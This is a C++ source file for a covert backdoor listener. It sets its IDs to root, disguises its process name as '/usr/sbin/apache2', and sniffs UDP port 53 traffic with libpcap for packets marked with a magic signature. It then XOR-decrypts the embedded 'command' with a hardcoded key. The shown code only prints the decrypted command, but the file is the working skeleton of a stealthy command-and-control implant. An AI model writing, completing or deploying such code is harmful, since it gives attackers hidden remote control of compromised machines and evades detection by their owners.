
#include <iostream>
#include <sys/prctl.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#include <pcap/pcap.h>


constexpr std::string_view FAKE_PROCESS_NAME = "/usr/sbin/apache2";
constexpr uint HEADERS_SIZE = sizeof(struct pcap_pkthdr);

constexpr uint ETHERNET_HEADER_SIZE = 14;
constexpr uint UDP_HEADER_SIZE = 8;

constexpr std::string_view SIGNATURE_ONE = "cr49s";
constexpr std::string_view SIGNATURE_TWO = "32pld";
constexpr uint SIGNATURE_SIZE = 5;

constexpr std::string_view KEY = "@DNJI(HSNA872w";


static pcap_if_t * findDevice()
{
	char buf[PCAP_ERRBUF_SIZE];
	pcap_if_t* allDevs;
	if (pcap_findalldevs(&allDevs, buf) == -1) {
		std::cout << "Error : pcap_findalldevs: " << buf << std::endl;
		return nullptr;
	}

	for (pcap_if_t* device = allDevs; device; device = device->next) {
		if (device->flags & PCAP_IF_UP && device->flags & PCAP_IF_RUNNING &&
			(!strncmp(device->name, "eth", 3) || !strncmp(device->name, "en", 2) || !strncmp(device->name, "wl", 2))) {
			return device;
		}
	}
	return nullptr;
};


static bool decrypt(const u_char encrypted[], unsigned char decrypted[], uint size)
{
	for (size_t i = 0; i < size; i++) {
		decrypted[i] = encrypted[i] ^ KEY[i % KEY.length()];
	}
	if (memcmp(decrypted, SIGNATURE_TWO.data(), strlen(SIGNATURE_TWO.data())) != 0) {
		return false;
	}
	return true;
}


void process_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* packet)
{
	std::cout << "Packet received" << std::endl;

	const ip* ip_header = (ip*)(packet + ETHERNET_HEADER_SIZE);
	const uint ip_header_len = ip_header->ip_hl * 4;

	const udphdr *udp_header = (udphdr*)(packet + ETHERNET_HEADER_SIZE + ip_header_len);
	const uint udp_len = htons(udp_header->uh_ulen);

	const uint total_header_size = ETHERNET_HEADER_SIZE + ip_header_len + UDP_HEADER_SIZE;

	const u_char* payload = packet + total_header_size;
	if (memcmp(payload, SIGNATURE_ONE.data(), strlen(SIGNATURE_ONE.data())) != 0) {
		std::cout << "Payload has no proper signature" << std::endl;
		return;
	}

	uint encrypted_size = udp_len - SIGNATURE_SIZE - UDP_HEADER_SIZE;
	unsigned char decrypted[encrypted_size];
	if (bool res = decrypt(payload + SIGNATURE_SIZE, decrypted, encrypted_size); !res) {
		return;
	}
	std::string command(reinterpret_cast<const char*>(decrypted + SIGNATURE_SIZE), encrypted_size - SIGNATURE_SIZE);
	std::cout << "Decrypted message: " <<  command << std::endl;
}


int main(int argc, char* argv[]) {

	setuid(0);
	setgid(0);
	prctl(PR_SET_NAME, FAKE_PROCESS_NAME, 0, 0, 0);
	strcpy(argv[0], FAKE_PROCESS_NAME.data());

	const pcap_if_t* device = findDevice();
	if (!device) {
		std::cout << "Error : findDevice" << std::endl;
		return 1;
	}

	char buf[PCAP_ERRBUF_SIZE];
	pcap_t* handler = pcap_open_live(device->name, 65536, 0, 1, buf);
	if (!handler) {
		std::cout << "Error : pcap_open_live" << std::endl;
		return 1;
	}

	constexpr char filter[] = "udp dst port 53";
	bpf_program fp = { 0 };
	if (pcap_compile(handler, &fp, filter, 0, PCAP_NETMASK_UNKNOWN) == -1) {
		std::cout << "Error : pcap_compile" << std::endl;
		pcap_close(handler);
		return 1;
	}

	if (pcap_setfilter(handler, &fp) == -1) {
		std::cout << "Error : pcap_setfilter" << std::endl;
		pcap_freecode(&fp);
		pcap_close(handler);
		return 1;
	}

	u_char buffer[1024];
	int res = pcap_loop(handler, 0, process_packet, buffer);
	pcap_close(handler);
}

